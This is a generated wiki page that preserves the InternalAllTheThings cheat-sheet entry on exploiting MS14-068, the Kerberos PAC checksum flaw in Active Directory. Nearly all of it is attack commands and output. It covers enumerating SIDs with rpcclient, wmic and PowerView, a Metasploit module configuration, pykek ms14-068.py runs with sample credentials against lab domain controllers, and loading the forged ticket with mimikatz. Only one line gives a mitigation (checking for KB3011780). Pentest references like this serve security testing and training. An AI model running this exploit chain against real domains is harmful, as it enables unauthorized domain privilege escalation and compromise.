---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# MS14-068 Checksum Validation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-cve-ms14-068` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/MS14-068.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MS14-068 Checksum Validation](../../topics/active-directory/ms14-068-checksum-validation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-cve-ms14-068 |
| name | MS14-068 Checksum Validation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/MS14-068.md |

## Preserved Source Material

````yaml
_body: "# MS14-068 Checksum Validation\n\nThis exploit require to know the user SID, you can use `rpcclient` to remotely get\
  \ it or `wmi` if you have an access on the machine.\n\n* RPCClient\n\n  ```powershell\n  rpcclient $> lookupnames john.smith\n\
  \  john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)\n  ```\n\n* WMI\n\n  ```powershell\n  wmic useraccount\
  \ get name,sid\n  Administrator  S-1-5-21-3415849876-833628785-5197346142-500   \n  Guest          S-1-5-21-3415849876-833628785-5197346142-501\
  \   \n  Administrator  S-1-5-21-297520375-2634728305-5197346142-500   \n  Guest          S-1-5-21-297520375-2634728305-5197346142-501\
  \   \n  krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   \n  lambda         S-1-5-21-297520375-2634728305-5197346142-1110\
  \ \n  ```\n\n* Powerview\n\n  ```powershell\n  Convert-NameToSid high-sec-corp.localkrbtgt\n  S-1-5-21-2941561648-383941485-1389968811-502\n\
  \  ```\n\n* netexec: `netexec ldap DC1.lab.local -u username -p password -k --get-sid`  \n\n```bash\nDoc: https://github.com/gentilkiwi/kekeo/wiki/ms14068\n\
  ```\n\nGenerate a ticket with `metasploit` or `pykek`\n\n```powershell\nMetasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum\n\
  \   Name      Current Setting                                Required  Description\n   ----      ---------------       \
  \                         --------  -----------\n   DOMAIN    LABDOMAIN.LOCAL                                yes       The\
  \ Domain (upper case) Ex: DEMO.LOCAL\n   PASSWORD  P@ssw0rd                                       yes       The Domain User\
  \ password\n   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier\n\
  \   RPORT     88                                             yes       The target port\n   Timeout   10                \
  \                             yes       The TCP timeout to establish connection and read data\n   USER      lambda     \
  \                                    yes       The Domain User\n   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106\
  \  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000\n```\n\n```powershell\n# Alternative\
  \ download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n$ git clone https://github.com/SecWiki/windows-kernel-exploits\n\
  $ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>\n$ python ./ms14-068.py\
  \ -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\n\
  $ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10\n$\
  \ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066\n\
  -1105\n  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending AS-REQ to msfdc01.metasploitable.local...\
  \ Done!\n  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing AS-REP from msfdc01.metasploitable.local...\
  \ Done!\n  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!\n  [+] Sending TGS-REQ to msfdc01.metasploitable.local...\
  \ Done!\n  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!\n  [+] Parsing TGS-REP from msfdc01.metasploitable.local...\
  \ Done!\n  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!\n```\n\nThen use `mimikatz` to load\
  \ the ticket.\n\n```powershell\nmimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\"\n```\n\
  \n## Mitigations\n\n* Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation\
  \ of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780\n\n## References\n\n\
  * [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)"
_relative_path: active-directory/CVE/MS14-068.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/MS14-068.md
````
